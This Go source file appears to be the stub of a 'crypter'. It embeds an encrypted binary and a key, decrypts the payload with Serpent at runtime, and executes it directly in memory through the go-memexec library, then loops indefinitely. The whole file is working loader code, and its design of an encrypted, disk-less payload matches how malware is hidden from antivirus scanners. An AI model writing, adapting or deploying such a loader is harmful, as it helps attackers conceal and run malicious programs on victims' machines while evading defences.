package main

import (
	_ "embed"
	"fmt"
	"goldr/crypter"
	"log"
	"time"

	"github.com/amenzhinsky/go-memexec"
)

var (
	//go:embed "key"
	key []byte
	//go:embed "cryptbin"
	cryptbin []byte
)

func main() {
	bin, err := crypter.SerpentDecrypt(cryptbin, key)
	if err != nil {
		fmt.Println(err.Error())
		log.Fatal(err.Error())
	}
	exe, err := memexec.New(bin)
	if err != nil {
		fmt.Println(err.Error())
		log.Fatal(err.Error())
	}
	defer exe.Close()

	cmd := exe.Command()
	out, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatalf("Error in CombinedOutput: %s", err.Error())
	}
	log.Printf("Output: %s", out)
	for {
		time.Sleep(5000)
	}
}
